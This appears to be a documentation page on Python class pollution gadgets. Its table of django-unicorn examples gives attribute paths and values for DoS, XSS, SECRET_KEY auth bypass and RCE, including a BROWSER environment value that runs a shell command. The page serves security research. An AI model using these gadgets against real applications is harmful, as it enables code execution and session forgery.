---
title: "Gadgets"
weight: 4
bookCollapseSection: true
---

# Class Pollution Gadgets

A **gadget** is a specific pollution target + value combination that achieves a meaningful security consequence. Similar to ROP gadgets in binary exploitation or prototype pollution gadgets in JavaScript, class pollution gadgets chain the pollution primitive to a concrete impact.

## Gadget Structure

Each gadget consists of:

1. **Pollution Key Path** — The chain of attributes/items to traverse from the polluted object to the target
2. **Example Value** — The value to write at the target
3. **Consequence** — The security impact (RCE, XSS, DoS, Auth Bypass)

## Known Gadgets from django-unicorn (Motivating Example)

| Consequence | Pollution Key Path | Example Value | Description |
|------------|-------------------|---------------|-------------|
| DoS | `__class__.__getattribute__` | `1337` | Overwriting the attribute access handler to a non-callable |
| XSS | `__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<` | `<script>alert(1337)</script>` | Overwriting character escape map |
| Auth Bypass | `__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY` | `"13371337"` | Overwriting Django's SECRET_KEY |
| RCE | `__init__.__globals__.sys.modules.os.environ` | `{"BROWSER": "/bin/sh -c 'touch /tmp/1337'"}` | Overwriting BROWSER env variable |
| RCE | `__init__.__globals__.location_cache._Cache__data.todo` | `["antigravity", "any"]` | Modifying module cache to load antigravity |

## Gadget Categories

Gadgets are organized by their consequence:

- [**RCE Gadgets**]({{< relref "rce" >}}) — Achieve remote code execution
- [**XSS Gadgets**]({{< relref "xss" >}}) — Achieve cross-site scripting
- [**DoS Gadgets**]({{< relref "dos" >}}) — Achieve denial of service
- [**Auth Bypass Gadgets**]({{< relref "auth-bypass" >}}) — Bypass authentication or authorization

## Gadget Discovery

Unlike JavaScript prototype pollution where universal gadgets exist (e.g., in template engines), Python class pollution gadgets are often application-specific because:

1. **Different modules loaded** — The available `sys.modules` varies per application
2. **Different class hierarchies** — The traversal path depends on what objects are accessible
3. **Different sinks** — The dangerous operations depend on the application's functionality

However, some gadgets are **semi-universal** across Python applications:
- `os.environ` manipulation (if `os` is imported)
- `sys.modules` cache poisoning
- `__getattribute__` overwrite (works on any class)
